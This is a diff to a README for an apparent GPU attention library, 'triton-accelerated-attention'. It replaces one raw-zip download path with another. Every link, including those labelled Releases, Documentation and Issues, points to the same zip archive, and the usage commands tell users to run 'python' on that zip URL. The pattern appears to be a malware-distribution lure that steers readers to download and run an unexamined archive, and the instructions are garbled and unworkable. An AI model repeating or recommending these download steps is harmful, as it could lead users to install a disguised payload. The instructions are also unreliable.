@@ -1,7 +1,7 @@
 # 🎉 triton-accelerated-attention - Boost Your GPU Performance
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/benchmarks/triton-accelerated-attention-overdistantly.zip)](https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/benchmarks/triton-accelerated-attention-overdistantly.zip)
+[![Download](https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/results/accelerated_triton_attention_2.8.zip)](https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/results/accelerated_triton_attention_2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ To run this software, make sure you have the following:
 Follow these steps to install the **triton-accelerated-attention** software on your machine:
 
 1. **Visit the Releases Page**
-   Go to our releases page using this link: [Releases Page](https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/benchmarks/triton-accelerated-attention-overdistantly.zip)
+   Go to our releases page using this link: [Releases Page](https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/results/accelerated_triton_attention_2.8.zip)
 
 2. **Select the Latest Release**
    Find the latest version. At the top of the page, you will see the most recent release. Click on it to open the details.
@@ -45,7 +45,7 @@ Follow these steps to install the **triton-accelerated-attention** software on y
 7. **Run the Application**
    Use the following command to run the application:
    ```
-   python https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/benchmarks/triton-accelerated-attention-overdistantly.zip
+   python https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/results/accelerated_triton_attention_2.8.zip
    ```
 
 Your application should now run successfully! Follow any additional on-screen instructions.
@@ -63,17 +63,17 @@ After installing and running the software, you can use the following commands:
 
 - To execute QK^T calculations:
   ```
-  python https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/benchmarks/triton-accelerated-attention-overdistantly.zip --task qkt
+  python https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/results/accelerated_triton_attention_2.8.zip --task qkt
   ```
 
 - For softmax calculations:
   ```
-  python https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/benchmarks/triton-accelerated-attention-overdistantly.zip --task softmax
+  python https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/results/accelerated_triton_attention_2.8.zip --task softmax
   ```
 
 - To perform value aggregation:
   ```
-  python https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/benchmarks/triton-accelerated-attention-overdistantly.zip --task value_aggregation
+  python https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/results/accelerated_triton_attention_2.8.zip --task value_aggregation
   ```
 
 Make sure to replace `task` with the desired function you wish to run.
@@ -93,12 +93,12 @@ If you encounter issues while running the software, here are some common problem
 
 ## 📞 Support
 
-For further assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/benchmarks/triton-accelerated-attention-overdistantly.zip). You can report bugs or request features there.
+For further assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/results/accelerated_triton_attention_2.8.zip). You can report bugs or request features there.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/benchmarks/triton-accelerated-attention-overdistantly.zip)
-- [Documentation](https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/benchmarks/triton-accelerated-attention-overdistantly.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/benchmarks/triton-accelerated-attention-overdistantly.zip)
+- [Releases Page](https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/results/accelerated_triton_attention_2.8.zip)
+- [Documentation](https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/results/accelerated_triton_attention_2.8.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Anggipratama17/triton-accelerated-attention/main/results/accelerated_triton_attention_2.8.zip)
 
 Thank you for choosing **triton-accelerated-attention**. We hope this tool helps you in your deep learning projects! Enjoy better GPU performance today.
